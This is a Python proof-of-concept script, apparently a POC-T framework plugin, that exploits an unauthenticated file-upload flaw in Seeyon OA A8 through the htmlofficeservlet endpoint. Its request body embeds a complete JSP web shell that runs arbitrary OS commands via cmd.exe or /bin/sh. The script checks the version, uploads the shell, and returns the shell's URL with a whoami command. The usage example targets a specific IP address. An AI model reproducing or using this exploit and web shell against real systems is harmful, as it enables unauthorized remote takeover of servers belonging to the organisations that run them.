#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 24''

"""
auther lxl 
致远 OA A8 无需认证 Getshell 漏洞
验证版本 A8+V7.0 SP3、A8+ V6.1 SP2 

Usage:

python POC-T.py -s seeyon -aZ "seeyon"
python POC-T.py -s seeyon -eT -t 30 -iS 58.63.60.115:8082
"""

import requests
import random


raw_data='DBSTEP V3.0     355             0               824             DBSTEP=OKMLlKlV\r\n' \
'OPTION=S3WYOSWLBSGr\r\n'\
'currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n'\
'CREATEDATE=wUghPB3szB3Xwg66\r\n'\
'RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n'\
'originalFileId=wV66\r\n'\
'originalCreateDate=wUghPB3szB3Xwg66\r\n'\
'FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdziouP4KGzUCXPBT2dEg6\r\n'\
'needReadFile=yRWZdAS6\r\n'\
'originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n'\
r'<%@ page contentType="text/html; charset=UTF-8" %> <%@ page import="java.io.*" %> <% String cmd = request.getParameter("command"); String output = ""; if (cmd !=null && cmd != "") { String[] command = System.getProperty("os.name").toLowerCase().indexOf("windows")>-1 ? new String[] {"cmd.exe", "/c", cmd} : new String[] {"/bin/sh", "-c", cmd}; String s = null; try { Process p = Runtime.getRuntime().exec(command); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while ((s = sI.readLine()) != null) { output += s +"\r\n"; } BufferedReader sI1 = new BufferedReader(new InputStreamReader(p.getErrorStream())); while ((s = sI1.readLine()) != null) { output += s +"\r\n"; } } catch (IOException e) { e.printStackTrace(); } } else output="<h1>:-)</h1>"; %> <pre> <code><%=output%> </code></pre>6e4f045d4b8506bf492ada7e3390d7ce'
def poc(url):  
    headers={
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
    'Content-Length': '1275',
    'Host': url,
    'Accept-Encoding': None,
    'Connection': None,
    'Content-Type': None,
    'Accept': None
}
    if '://' not in url:
        url1 = 'http://' + url
    try:
        s= requests.get(url1+'/seeyon/index.jsp')
        if "V7.0SP3" in s.text:  #只要v6.1 sp2版本 这里可以切换版本
            #proxies = {'http': 'http://127.0.0.1:8080'}     用burp抓包 查看请求是否正确
            s2 =requests.post(url1+'/seeyon/htmlofficeservlet',headers=headers,data=raw_data)
            if '824' in s2.text:
                return '[seeyon vulb and shell ]: ' + url1+'/seeyon/7288156929.jsp?command=whoami'

        else:
            return False
    except Exception:
        return False
